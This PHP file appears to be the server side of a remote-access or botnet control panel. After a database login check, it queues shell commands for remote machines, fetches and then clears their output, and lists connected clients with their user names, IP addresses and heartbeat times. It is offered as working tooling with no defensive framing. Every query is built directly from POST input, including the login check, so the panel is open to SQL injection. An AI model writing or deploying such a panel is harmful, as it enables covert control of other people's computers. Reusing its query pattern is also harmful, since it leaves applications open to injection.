<?
$sql = new mysqli("localhost", "root","","RCuDB");
if(isset($_POST['login']) && isset($_POST['password'])){
	$singup = $sql->query("SELECT `login` FROM `masterDB` WHERE `login` = '".$_POST['login']."' AND `password` = '".$_POST['password']."'")->fetch_assoc();
	if($singup == NULL) die("Incorrect login or password");
	ob_start();
	if(isset($_POST['id'])){
		if($_POST['to'] == "SET"){
			echo "Trying to set input...\n";
			$sql->query("UPDATE `tDB` SET `CMD`='".$_POST['cmd']."' WHERE `id`='".$_POST['id']."'");
			if($sql->errno)
				echo "SQL Error N".$sql->errno." - ".$sql->error;
		}
		else if($_POST['to'] == "GET"){
			$res = $sql->query("SELECT `CMDRes` FROM `tDB` WHERE `id`='".$_POST['id']."'");
			if(($r = $res->fetch_assoc())!=null){
				echo "Trying to get output...\n";
				echo $r['CMDRes'];
			}
			$sql->query("UPDATE `tDB` SET `CMDRes`=NULL WHERE `id`='".$_POST['id']."'");
		}
	}else{
		$get = $sql->query("SELECT `id`,`UID`, `PCUser`, `IP`, `FIRSTDATE`, `LASTUPSIGNAL` FROM `tDB` WHERE 1");
		$a = array();
		$PAD = array("id"=>2,"UID"=>16,"PCUser"=>6, "IP"=> 15, "FIRSTDATE"=>27, "LASTUPSIGNAL"=>27);
		while($r = $get->fetch_assoc()){
			$a[] = $r;
			$PAD['id'] = (strlen($r['id']) > $PAD['id']) ? strlen($r['id']) : $PAD['id'];
			$PAD['PCUser'] = (strlen($r['PCUser']) > $PAD['PCUser']) ? strlen($r['PCUser']) : $PAD['PCUser'];
		}
		echo "|".str_pad("id", $PAD['id'], "_", STR_PAD_BOTH)."|".str_pad("UID", $PAD['UID'], "_", STR_PAD_BOTH)."|".str_pad("PC User", $PAD['PCUser'], "_", STR_PAD_BOTH)."|".str_pad("IP", $PAD['IP'], "_", STR_PAD_BOTH)."|".str_pad("First UP", $PAD['FIRSTDATE'], "_", STR_PAD_BOTH)."|".str_pad("Last UP", $PAD['LASTUPSIGNAL'], "_", STR_PAD_BOTH)."|".PHP_EOL;
		foreach($a as $e){
			foreach($e as $K=>$V){
				if($K == 'FIRSTDATE' or $K == 'LASTUPSIGNAL') $V = date("M-d-Y H:i:s/P" ,$V);
				echo "|".str_pad($V, $PAD[$K], " ", STR_PAD_BOTH);
			}
			echo "|".PHP_EOL;
		}
	}
	ob_end_flush();
}

?>
